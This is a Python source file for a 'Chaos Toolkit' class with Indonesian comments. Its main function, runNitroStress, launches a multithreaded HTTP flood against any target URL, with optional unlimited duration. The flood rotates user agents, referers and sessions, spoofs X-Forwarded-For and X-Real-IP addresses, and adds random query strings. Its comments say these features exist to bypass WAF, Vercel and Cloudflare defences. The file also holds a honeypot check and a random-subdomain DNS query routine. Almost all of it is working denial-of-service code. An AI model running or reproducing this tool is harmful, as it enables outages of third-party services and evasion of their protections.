import socket
import random
import threading
import time
import requests
import secrets

# * Modul Chaos Toolkit (Zaqi Nitro Boost Edition)
class SpecialTools:
    def __init__(self):
        self.isFlooding = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
        ]
        self.referers = [
            "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
            "https://www.reddit.com/", "https://twitter.com/", "https://www.facebook.com/",
            "https://t.co/", "https://github.com/", "https://stackoverflow.com/"
        ]
        self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}

    # * Deteksi HoneyPot (Advanced Delay Measurement)
    def detectHoneypot(self, target):
        start = time.time()
        try:
            socket.create_connection((target, 80), timeout=2)
            delay = time.time() - start
            return delay > 1.5
        except Exception:
            return False

    # * Nitro Stress Engine (Porting from Destroyer/Agile Profile)
    def runNitroStress(self, targetUrl, duration=15, threads=50):
        self.isFlooding = True
        self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
        print(f"[*] Starting NITRO STRESS on {targetUrl} with {threads} threads.")
        
        def attack_worker():
            # * Unlimited duration if set to 0
            timeout = (time.time() + duration) if duration > 0 else (time.time() + 999999)
            session = requests.Session()
            request_count = 0
            
            while time.time() < timeout and self.isFlooding:
                if hasattr(self, 'core') and self.core and self.core.stop_requested:
                    break
                
                # * Session Rotation v5.8.16 (Bypass Sticky WAF)
                request_count += 1
                if request_count % 500 == 0:
                    session.close()
                    session = requests.Session()

                try:
                    # -- NITRO BOOST OPTIMIZATION v5.8.15 --
                    # Jitter & Stealth Logic (Bypass WAF/Vercel)
                    time.sleep(random.uniform(0.01, 0.05))
                    
                    random_str = secrets.token_hex(4)
                    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'DNT': '1',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-User': '?1',
                        'Sec-CH-UA': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                        'Sec-CH-UA-Mobile': '?0',
                        'Sec-CH-UA-Platform': '"Windows"',
                        'X-Forwarded-For': fake_ip,
                        'X-Real-IP': fake_ip,
                        'Cache-Control': 'no-cache',
                        'Referer': random.choice(self.referers)
                    }
                    
                    # Target Profile logic (Bypass Vercel/Cloudflare basics)
                    connector = '&' if '?' in targetUrl else '?'
                    test_url = f"{targetUrl}{connector}nitro={random_str}"
                    
                    resp = session.get(test_url, headers=headers, timeout=5, allow_redirects=True)
                    
                    code = resp.status_code
                    if code == 200: self.stats["success"] += 1
                    elif code == 403 or code == 429: self.stats["blocked"] += 1
                    elif 300 <= code < 400: self.stats["redirect"] += 1
                    else: self.stats["error"] += 1
                    
                except Exception:
                    self.stats["error"] += 1
            session.close()

        # Launch Threads
        workers = []
        for _ in range(threads):
            t = threading.Thread(target=attack_worker, daemon=True)
            t.start()
            workers.append(t)
            
        return f"Nitro Stress initiated (Profile: Destroyer) for {duration} seconds."

    # * Stop all active stress tests
    def stopChaos(self):
        self.isFlooding = False
        return "Chaos activities stopped."

    # * DNS Stress Test (Safe mining)
    def dnsStressTest(self, target):
        try:
            for i in range(5):
                socket.gethostbyname(f"zaqidev{random.randint(1,999)}.{target}")
            return "DNS Queries sent (Nitro Mode)."
        except Exception as e:
            return f"DNS Error: {str(e)}"
